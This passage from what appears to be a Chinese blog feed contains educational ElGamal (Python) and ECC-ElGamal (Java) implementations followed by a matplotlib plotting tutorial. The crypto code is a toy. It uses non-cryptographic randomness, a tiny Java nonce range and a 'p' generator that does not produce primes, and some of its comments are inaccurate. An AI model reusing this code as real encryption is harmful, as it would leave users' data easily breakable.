<span class="hljs-literal">False</span>      <span class="hljs-comment"># 使用二次定理的逆定理，确定 n 为合数。</span><br>        x = newX<br><br>    <span class="hljs-keyword">if</span> x != <span class="hljs-number">1</span>:                <span class="hljs-comment"># 如果 x=a^(n-1) (mod n)，则确定 n 为合数。</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>               <span class="hljs-comment"># 通过费马小定理的逆定理判断。通过这个测试的数很可能是质数。</span><br><br><br><span class="hljs-comment"># 扩展欧几里得算法，ab=1 (mod m)，得到 A 在模 m 下的乘法逆元 b</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Extended_Eulid</span>(<span class="hljs-params">a: <span class="hljs-built_in">int</span>, m: <span class="hljs-built_in">int</span></span>) -&gt; <span class="hljs-built_in">int</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">extended_eulid</span>(<span class="hljs-params">a: <span class="hljs-built_in">int</span>, m: <span class="hljs-built_in">int</span></span>):<br>        <span class="hljs-keyword">if</span> a == <span class="hljs-number">0</span>:  <span class="hljs-comment"># 边界条件</span><br>            <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, m<br>        <span class="hljs-keyword">else</span>:<br>            x, y, gcd = extended_eulid(m % a, a)  <span class="hljs-comment"># 递归</span><br>            x, y = y, (x - (m // a) * y)  <span class="hljs-comment"># 递归，左端是上层</span><br>            <span class="hljs-keyword">return</span> x, y, gcd              <span class="hljs-comment"># 返回第一层计算的结果。</span><br>        <span class="hljs-comment"># 最终返回的 y 值是 b 在模 a 下的乘法逆元</span><br>        <span class="hljs-comment"># 如果 y 是复数，y 加 a 是相应的正逆元</span><br><br>    n = extended_eulid(a, m)<br>    <span class="hljs-keyword">if</span> n[<span class="hljs-number">1</span>] &lt; <span class="hljs-number">0</span>:<br>        <span class="hljs-keyword">return</span> n[<span class="hljs-number">1</span>] + m<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> n[<span class="hljs-number">1</span>]<br><br><br><span class="hljs-comment"># 生成参数 p，大约 512bits 长度</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Generate_p</span>() -&gt; <span class="hljs-built_in">int</span>:<br>    a = random.randint(<span class="hljs-number">2</span>**<span class="hljs-number">512</span>, <span class="hljs-number">2</span>**<span class="hljs-number">1024</span>)<br>    <span class="hljs-keyword">while</span> gcd(a, <span class="hljs-number">2</span>) != <span class="hljs-number">1</span>:<br>        a = random.randint(<span class="hljs-number">2</span>**<span class="hljs-number">512</span>, <span class="hljs-number">2</span>**<span class="hljs-number">1024</span>)<br>    <span class="hljs-keyword">return</span> a<br><br><br><span class="hljs-comment"># 生成参数 alpha</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Generate_alpha</span>(<span class="hljs-params">p: <span class="hljs-built_in">int</span></span>) -&gt; <span class="hljs-built_in">int</span>:<br>    <span class="hljs-keyword">return</span> random.randint(<span class="hljs-number">2</span>, p)<br><br><br><span class="hljs-comment"># 生成小于 p 的质数，大约 512bits 长，作为私钥</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Generate_private_key</span>(<span class="hljs-params">p: <span class="hljs-built_in">int</span></span>) -&gt; <span class="hljs-built_in">int</span>:<br>    pri = random.randint(<span class="hljs-number">1</span>, p - <span class="hljs-number">1</span>)<br>    <span class="hljs-keyword">while</span> gcd(pri, p) != <span class="hljs-number">1</span>:<br>        pri = random.randint(<span class="hljs-number">1</span>, p - <span class="hljs-number">1</span>)<br>    <span class="hljs-keyword">return</span> pri<br><br><br><span class="hljs-comment"># B 或 A 使用参数 P 和生成的秘钥来加密消息</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">encrypt</span>(<span class="hljs-params">message, p, Key_mask</span>) -&gt; <span class="hljs-built_in">int</span>:<br>    ciphertext = (message * Key_mask) % p<br>    <span class="hljs-keyword">return</span> ciphertext<br><br><br><span class="hljs-comment"># B 或 A 使用参数 P 和他们获得的秘钥来解密密文</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt</span>(<span class="hljs-params">ciphertext, p, Key_mask</span>):<br>    <span class="hljs-comment"># 逆掩码</span><br>    inverse_element = Extended_Eulid(Key_mask, p)<br>    <span class="hljs-comment"># 解码</span><br>    plaintext = (ciphertext * inverse_element) % p<br>    <span class="hljs-keyword">return</span> plaintext<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">fast_exp</span>(<span class="hljs-params">a: <span class="hljs-built_in">int</span>, b: <span class="hljs-built_in">int</span></span>) -&gt; <span class="hljs-built_in">int</span>:<br>    ans = <span class="hljs-number">1</span><br>    <span class="hljs-keyword">while</span> b != <span class="hljs-number">0</span>:<br>        <span class="hljs-keyword">if</span> b &amp; <span class="hljs-number">1</span>:<br>            ans = ans * a<br>        b &gt;&gt;= <span class="hljs-number">1</span><br>        a = a * a<br>    <span class="hljs-keyword">return</span> ans<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Generate_prime</span>(<span class="hljs-params">key_size: <span class="hljs-built_in">int</span></span>) -&gt; <span class="hljs-built_in">int</span>:<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        num = random.randrange(fast_exp(<span class="hljs-number">2</span>, key_size - <span class="hljs-number">1</span>), fast_exp(<span class="hljs-number">2</span>, key_size))<br>        <span class="hljs-keyword">if</span> Miller_Rabin(num):<br>            <span class="hljs-keyword">return</span> num<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    message = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;Message:&quot;</span>))<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">type</span>(message) != <span class="hljs-built_in">int</span>:<br>        <span class="hljs-keyword">raise</span> ValueError(<span class="hljs-string">&quot;必须是整数!&quot;</span>)<br><br>    p = Generate_prime(<span class="hljs-number">512</span>)<br>    g = Generate_alpha(p)<br><br>    <span class="hljs-comment"># A 选择自己的私钥，计算自己的公钥，并将公钥传递给 Bob</span><br>    k1 = Generate_private_key(p)<br>    beta1 = power(g, k1, p)<br><br>    <span class="hljs-comment"># B 选择自己的私钥，计算的公钥，并将公钥放在网络上</span><br>    k2 = Generate_private_key(p)<br>    beta2 = power(g, k2, p)<br><br>    <span class="hljs-comment"># B 和 A 分别计算密钥，结果应该相同</span><br>    Key_mask_A1 = power(beta1, k2, p)<br>    Key_mask_B1 = power(beta2, k1, p)<br><br>    <span class="hljs-comment"># B 加密消息</span><br>    ciphertext = encrypt(message, p, Key_mask_B1)<br><br>    <span class="hljs-comment"># A 解密消息</span><br>    plaintext = decrypt(ciphertext, p, Key_mask_A1)<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;参数: &quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;p:   &quot;</span>, p)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;生成元g:    &quot;</span>, g)<br>    <span class="hljs-built_in">print</span>()<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;私钥: &quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;r1:  &quot;</span>, k1)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;r2:  &quot;</span>, k2)<br>    <span class="hljs-built_in">print</span>()<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;公钥: &quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;A:   &quot;</span>, beta1)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;B:     &quot;</span>, beta2)<br>    <span class="hljs-built_in">print</span>()<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;密钥:  &quot;</span>, Key_mask_B1)<br>    <span class="hljs-built_in">print</span>()<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;密文:  &quot;</span>, ciphertext)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;明文:   &quot;</span>, plaintext)<br></code></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 密码学 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> EIGamal </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ECC-ElGamal</title>
      <link href="/2024/05/25/ECC_EIGamal/"/>
      <url>/2024/05/25/ECC_EIGamal/</url>
      
        <content type="html"><![CDATA[<p>以下是 ECC-ElGamal 的算法原理：</p><p> <em><strong>公共参数</strong></em></p><p>1.<strong>G</strong>：椭圆曲线基点</p><p>2.<strong>SK</strong>：私钥，SK&#x3D;d</p><p><em>（d 是 0 到椭圆曲线的阶 q 之间的随机数）</em></p><p>3.<strong>PK</strong>：公钥，PK&#x3D;dG</p><p> <em><strong>加密</strong></em></p><p>1.<strong>明文 m，随机数 r</strong></p><p>2.<strong>计算密文 C</strong>：</p><p><img src="/../img/1.png" alt="img"></p><p>（3）明文 m 的取值范围为模 order(G) 的模空间，但实际使用时 m 需限制为较小的数<em>（例如 32 比特长度）</em>，否则椭圆曲线离散对数问题<em>（ECDLP）</em>无法求解。</p><p><em><strong>解密</strong></em><br>1.<strong>计算 rPK</strong>：</p><p><img src="/../img/2.png" alt="img"></p><p>2.<strong>计算 mG</strong>：</p><p><img src="/../img/3.png" alt="img"></p><p>3.计算 mG 的 ECDLP，获得明文 m。</p><p><em><strong>密文加法、密文减法</strong></em></p><p>1.<strong>两个密文</strong>：</p><p><img src="/../img/4.png" alt="img"></p><p>2**.密文加**：</p><p>对 2 个密文的 2 个 ECC 点分别做点加，共 2 个点加，公式如下：</p><p><img src="/../img/5.png" alt="img"></p><p>3.<strong>密文减</strong>：</p><p>对 2 个密文的 2 个 ECC 点分别做点减，共 2 个点减，公式如下：</p><p><img src="/../img/6.png" alt="img"></p><p><img src="/../img/7.png" alt="img"></p><p><em><strong>密文标量乘法</strong></em></p><p>1.<strong>密文</strong></p><p><img src="/../img/8.png" alt="img"></p><p>2.对密文的 2 个 ECC 点分别用  _2 做点乘，共 2 个点乘，公式如下：</p><p><img src="/../img/9.png" alt="img"></p><p>3.如上公式与明文m2m1的同态加密结果一致：</p><p><img src="/../img/10.png" alt="img"></p><p>这里 r&#x3D;m2r1</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Pare</span> &#123;<br>    <span class="hljs-type">long</span> x;<br>    <span class="hljs-type">long</span> y;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Pare</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-built_in">super</span>();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Pare</span><span class="hljs-params">(<span class="hljs-type">long</span> x, <span class="hljs-type">long</span> y)</span> &#123;<br>        <span class="hljs-built_in">super</span>();<br><br>        <span class="hljs-built_in">this</span>.x = x;<br>        <span class="hljs-built_in">this</span>.y = y;<br>    &#125;<br><br>    <span class="hljs-comment">//加法</span><br>    <span class="hljs-keyword">public</span> Pare <span class="hljs-title function_">add</span><span class="hljs-params">(Pare pare)</span> &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.x == Integer.MAX_VALUE) &#123;<span class="hljs-comment">//为无穷大时O+P=P</span><br>            <span class="hljs-keyword">return</span> pare;<br>        &#125;<br>        <span class="hljs-type">Pare</span> <span class="hljs-variable">res</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Pare</span>();<br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.y == pare.y &amp;&amp; <span class="hljs-built_in">this</span>.x == pare.x) &#123;<span class="hljs-comment">//相等时</span><br>            <span class="hljs-type">long</span> <span class="hljs-variable">d</span> <span class="hljs-operator">=</span> moddivision(<span class="hljs-number">3</span> * <span class="hljs-built_in">this</span>.x * <span class="hljs-built_in">this</span>.x + EccUtil.e.a, EccUtil.e.p, <span class="hljs-number">2</span> * <span class="hljs-built_in">this</span>.y);<br><br>            res.x = d * d - <span class="hljs-number">2</span> * <span class="hljs-built_in">this</span>.x;<br>            res.x = mod(res.x, EccUtil.e.p);<br><br>            res.y = d * (<span class="hljs-built_in">this</span>.x - res.x) - <span class="hljs-built_in">this</span>.y;<br>            res.y = mod(res.y, EccUtil.e.p);<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (pare.x - <span class="hljs-built_in">this</span>.x != <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-type">long</span> <span class="hljs-variable">d</span> <span class="hljs-operator">=</span> moddivision(pare.y - <span class="hljs-built_in">this</span>.y, EccUtil.e.p, pare.x - <span class="hljs-built_in">this</span>.x);<br>            res.x = d * d - <span class="hljs-built_in">this</span>.x - pare.x;<br>            res.x = mod(res.x, EccUtil.e.p);<br><br>            res.y = d * (<span class="hljs-built_in">this</span>.x - res.x) - <span class="hljs-built_in">this</span>.y;<br>            res.y = mod(res.y, EccUtil.e.p);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<span class="hljs-comment">//P Q互逆,返回无穷大</span><br>            res.x = Integer.MAX_VALUE;<br>            res.y = Integer.MAX_VALUE;<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> res;<br>    &#125;<br><br>    <span class="hljs-comment">//减法</span><br>    <span class="hljs-keyword">public</span> Pare <span class="hljs-title function_">less</span><span class="hljs-params">(Pare p)</span> &#123;<br>        p.y *= -<span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">return</span> add(p);<br>    &#125;<br><br>    <span class="hljs-comment">//乘法</span><br>    <span class="hljs-keyword">public</span> Pare <span class="hljs-title function_">multiply</span><span class="hljs-params">(<span class="hljs-type">long</span> num)</span> &#123;<br>        <span class="hljs-type">Pare</span> <span class="hljs-variable">p</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Pare</span>(<span class="hljs-built_in">this</span>.x, <span class="hljs-built_in">this</span>.y);<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">long</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span>; i &lt; num; i++) &#123;<br>            p = p.add(<span class="hljs-built_in">this</span>);<br>        &#125;<br>        <span class="hljs-keyword">return</span> p;<br>    &#125;<br><br>    <span class="hljs-comment">//求余,解决负号问题</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">long</span> <span class="hljs-title function_">mod</span><span class="hljs-params">(<span class="hljs-type">long</span> a, <span class="hljs-type">long</span> b)</span> &#123;<br>        a = a % b;<br>        <span class="hljs-keyword">while</span> (a &lt; <span class="hljs-number">0</span>) &#123;<br>            a += b;<br>        &#125;<br>        <span class="hljs-keyword">return</span> a;<br>    &#125;<br><br>    <span class="hljs-comment">//求余取商(a mod b)/c</span><br>    <span class="hljs-comment">/*public long moddivision(long a, long b, long c) &#123;</span><br><span class="hljs-comment">a = mod(a,b);</span><br><span class="hljs-comment">while(a%c != 0) &#123;</span><br><span class="hljs-comment">a += b;</span><br><span class="hljs-comment">&#125;</span><br><span class="hljs-comment">a = a/c;</span><br><span class="hljs-comment">return a;</span><br><span class="hljs-comment">&#125;*/</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">long</span> <span class="hljs-title function_">moddivision</span><span class="hljs-params">(<span class="hljs-type">long</span> a, <span class="hljs-type">long</span> b, <span class="hljs-type">long</span> c)</span> &#123;<br>        a = mod(a, b);<br>        c = mod(c, b);<br>        a = a * EccMath.exgcd(c, b);<br>        <span class="hljs-keyword">return</span> mod(a, b);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> EccTools.obox(EccTools.long2hexStr(<span class="hljs-built_in">this</span>.x), <span class="hljs-number">4</span>) + <span class="hljs-string">&quot; &quot;</span> + EccTools.obox(EccTools.long2hexStr(<span class="hljs-built_in">this</span>.y), <span class="hljs-number">4</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">//加密</span><br><span class="hljs-keyword">public</span> Message <span class="hljs-title function_">encryption</span><span class="hljs-params">(Pare g, Pare pbk, Pare word)</span> &#123;<br>    pbk = g.multiply(privatekey);<span class="hljs-comment">//公钥</span><br>    <span class="hljs-type">int</span> <span class="hljs-variable">d</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Random</span>().nextInt(<span class="hljs-number">1024</span>);<span class="hljs-comment">//随机数</span><br>    <span class="hljs-type">Pare</span> <span class="hljs-variable">dg</span> <span class="hljs-operator">=</span> g.multiply(d);<br>    <span class="hljs-type">Pare</span> <span class="hljs-variable">dp</span> <span class="hljs-operator">=</span> pbk.multiply(d);<br>    <span class="hljs-type">Pare</span> <span class="hljs-variable">send</span> <span class="hljs-operator">=</span> word.add(dp);<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Message</span>(dg, send);<br>&#125;<br><br><span class="hljs-comment">//解密</span><br><span class="hljs-keyword">public</span> Pare <span class="hljs-title function_">decryption</span><span class="hljs-params">(Message m)</span> &#123;<br>    <span class="hljs-type">Pare</span> <span class="hljs-variable">pab</span> <span class="hljs-operator">=</span> m.pa.multiply(<span class="hljs-built_in">this</span>.privatekey);<br>    <span class="hljs-type">Pare</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> m.pb.less(pab);<br>    <span class="hljs-keyword">return</span> result;<br>&#125;<br><br><br></code></pre></td></tr></table></figure><p><img src="https://pic-1326114322.cos.ap-chongqing.myqcloud.com/202407191643957.png"></p><p><img src="https://alan-1314474364.cos.ap-chongqing.myqcloud.com/blog/202407211646416.png"></p>]]></content>
      
      
      <categories>
          
          <category> 密码学 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ECC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>matplotlib</title>
      <link href="/2024/05/25/matplotlib/"/>
      <url>/2024/05/25/matplotlib/</url>
      
        <content type="html"><![CDATA[<h1 id="matplotlib"><a href="#matplotlib" class="headerlink" title="matplotlib"></a>matplotlib</h1><p>Matplotlib 首次发布于2007 年，因其在函数设计方面<strong>参考了Matlab，所以其名字以“Mat”开 头，中间的“plot”表示绘图的作用，结尾的“lib”表明它是一个集合</strong>。近年来，Matplotlib 库是Python 中绘制二维、三维图表的数据可视化工具，在科学计算领域被得到了广泛应用，具有以下突出优点： 使用简单绘图语言实现复杂绘图；以交互式操作实现数据可视化；采用嵌入式Latex 输出图表、表达式以及文本；实现对图像元素的精细化控制；可输png、eps 等多种格式；</p><h2 id="pyplot-基础语法"><a href="#pyplot-基础语法" class="headerlink" title="pyplot 基础语法"></a>pyplot 基础语法</h2><p>pyplot 是 matplotlib 的内部模块，包含各种命令风格函数，它提供了操作 matplotlib 库的经典python 编程接口，具有单独的命名空间。本实验选择使用pyplot 模块作为主要工具进行图形绘制，学习使用pyplot 绘制各类图表的基础语法是图像绘制的前提。大部分pyplot 图形绘制都遵循一个固定的流程模式，通过这个流程就可以完成基础图表的绘制。pyplot 基本绘图流程如图所示：</p><p><img src="/../img/mat1.jpg" alt="img"> </p><p>上述流程图第一部分主要作用是创建一个空白画布，并可以选择是否将空白画布划分为多个部分，以便在同一幅图上绘制多个子图。若只需要绘制一个简单的图形，便不需考虑这一部分的内容。</p><h3 id="创建画布"><a href="#创建画布" class="headerlink" title="创建画布"></a>创建画布</h3><p>在实际绘图过程中，创建画布以及选中子图的函数如图 所示：</p><p><img src="/../img/mat2.jpg" alt="img"> </p><p>其中添加标题、添加x&#x2F;y 坐标轴以及绘制图形不分先后顺序。可以先绘制图形，也可以先添加各类标签。</p><h3 id="绘制图形以及添加各类标签"><a href="#绘制图形以及添加各类标签" class="headerlink" title="绘制图形以及添加各类标签"></a>绘制图形以及添加各类标签</h3><p>常用函数：</p><p><img src="/../img/mat3.jpg" alt="img"> </p><h3 id="保存以及显示图形"><a href="#保存以及显示图形" class="headerlink" title="保存以及显示图形"></a>保存以及显示图形</h3><p>常用函数:</p><p><img src="/../img/mat4.jpg" alt="img"> </p><p>根据上述示意流程图参考以及不同模块绘图语言相互配合调用，可进行图形简易绘制。</p><p>这只是一些Matplotlib.pyplot功能的基础示例。Matplotlib.pyplot提供了许多其他函数和选项，可用于自定义图表的外观、样式、标签等。参考Matplotlib的官方文档以获取更多详细信息和示例：<a href="https://matplotlib.org/stable/contents.html">Matplotlib文档</a></p><h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><h3 id="1-散点图"><a href="#1-散点图" class="headerlink" title="1.散点图"></a>1.散点图</h3><h4 id="代码实现："><a href="#代码实现：" class="headerlink" title="代码实现："></a>代码实现：</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> matplotlib.pyplot <span class="hljs-keyword">as</span> plt<br><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><br>x=np.linspace(<span class="hljs-number">0.05</span>,<span class="hljs-number">10</span>,<span class="hljs-number">100</span>)<br>y=np.random.rand(<span class="hljs-number">100</span>)<br>plt.scatter(x,y,label=<span class="hljs-string">&#x27;scatter figure&#x27;</span>)<br>plt.title(<span class="hljs-string">&#x27;scatter figure&#x27;</span>)<br>plt.xlim(<span class="hljs-number">0.05</span>,<span class="hljs-number">10</span>)<br>plt.ylim(<span class="hljs-number">0</span>,<span class="hljs-number">1</span>)<br>plt.show()<br></code></pre></td></tr></table></figure><h4 id="代码逻辑"><a href="#代码逻辑" class="headerlink" title="代码逻辑:"></a>代码逻辑:</h4><p>1.使用<code>numpy</code>的<code>linspace</code>函数生成一个从0.05到10的等差数列，包含100个元素。这个数列将用作散点图中的x坐标。</p><p>2.使用<code>numpy</code>的<code>random.rand</code>函数生成一个包含100个元素的随机数数组，这些数将用作散点图中的y坐标。</p><p>3.调用<code>plt.scatter</code>函数绘制散点图，传入x和y坐标数组，并设置标签为<code>scatter figure</code>。</p><p>4.调用<code>plt.title</code>函数为图表添加标题<code>scatter figure</code>。</p><p>5.使用<code>plt.xlim</code>和<code>plt.ylim</code>函数设置x轴和y轴的显示范围。x轴的范围是0.05到10，y轴的范围是0到1。</p><p>6.调用<code>plt.show</code>函数显示绘制的散点图。</p><h4 id="结果："><a href="#结果：" class="headerlink" title="结果："></a>结果：</h4><p><img src="/../img/mat5.jpg" alt="img"></p><h3 id="2-折线图"><a href="#2-折线图" class="headerlink" title="2.折线图"></a>2.折线图</h3><h4 id="代码实现：-1"><a href="#代码实现：-1" class="headerlink" title="代码实现："></a>代码实现：</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> matplotlib.pyplot <span class="hljs-keyword">as</span> plt<br><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><br>x=np.linspace(<span class="hljs-number">0.0</span>,<span class="hljs-number">10</span>,<span class="hljs-number">40</span>)<br>y=np.random.randn(<span class="hljs-number">40</span>)<br>plt.plot(x,y,ls=<span class="hljs-string">&#x27;-&#x27;</span>,lw=<span class="hljs-number">2</span>,marker=<span class="hljs-string">&#x27;o&#x27;</span>,ms=<span class="hljs-number">10</span>,mfc=<span class="hljs-string">&#x27;red&#x27;</span>,alpha=<span class="hljs-number">0.5</span>)<br>plt.show()<br></code></pre></td></tr></table></figure><h4 id="代码逻辑："><a href="#代码逻辑：" class="headerlink" title="代码逻辑："></a>代码逻辑：</h4><p>1.使用<code>numpy</code>的<code>linspace</code>函数生成一个从0.0到10的等差数列，包含40个元素。这个数列将用作线图中的x坐标。</p><p>2.使用<code>numpy</code>的<code>random.randn</code>函数生成一个包含40个元素的随机数数组，这些数将用作线图中的y坐标。<code>random.randn</code>生成的是标准正态分布的随机数。</p><p>3.调用<code>plt.plot</code>函数绘制线图，传入x和y坐标数组，并设置以下参数：<code>ls</code>&#x3D;’-‘：线条样式为实线。<code>lw</code>&#x3D;2：线条宽度为2。<code>marker</code>&#x3D;’o’：标记样式为圆形。<code>ms</code>&#x3D;10：标记大小为10。<code>mfc</code>&#x3D;’red’：标记填充颜色为红色。<code>alpha</code>&#x3D;0.5：透明度为0.5。</p><p>4.最后，调用<code>plt.show</code>函数显示绘制的线图。</p><h4 id="结果：-1"><a href="#结果：-1" class="headerlink" title="结果："></a>结果：</h4><p><img src="/../img/mat6.jpg" alt="img"></p><h3 id="3-平面函数"><a href="#3-平面函数" class="headerlink" title="3.平面函数"></a>3.平面函数</h3><h4 id="代码实现：-2"><a href="#代码实现：-2" class="headerlink" title="代码实现："></a>代码实现：</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> matplotlib.pyplot <span class="hljs-keyword">as</span> plt<br><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><br>x=np.arange(<span class="hljs-number">0</span>,<span class="hljs-number">1.1</span>,<span class="hljs-number">0.01</span>)<br>plt.xlabel(<span class="hljs-string">&#x27;x&#x27;</span>) <span class="hljs-comment">#添加x轴名称</span><br>plt.ylabel(<span class="hljs-string">&#x27;y&#x27;</span>) <span class="hljs-comment">#添加y轴名称</span><br>plt.title(<span class="hljs-string">&#x27;y=lines(x)&#x27;</span>)<span class="hljs-comment">#添加标题</span><br><br>plt.xlim((<span class="hljs-number">0</span>,<span class="hljs-number">1</span>)) <span class="hljs-comment">#设定x轴范围</span><br>plt.ylim((<span class="hljs-number">0</span>,<span class="hljs-number">1</span>)) <span class="hljs-comment">#设定y轴范围</span><br>plt.xticks([<span class="hljs-number">0</span>,<span class="hljs-number">0.2</span>,<span class="hljs-number">0.4</span>,<span class="hljs-number">0.6</span>,<span class="hljs-number">0.8</span>,<span class="hljs-number">1</span>])<span class="hljs-comment">#设定x轴范围</span><br>plt.yticks([<span class="hljs-number">0</span>,<span class="hljs-number">0.2</span>,<span class="hljs-number">0.4</span>,<span class="hljs-number">0.6</span>,<span class="hljs-number">0.8</span>,<span class="hljs-number">1</span>])<span class="hljs-comment">#设定y轴范围</span><br><br>plt.plot(x,x)<span class="hljs-comment">#绘制y=x曲线</span><br>plt.plot(x,x**<span class="hljs-number">3</span>)<span 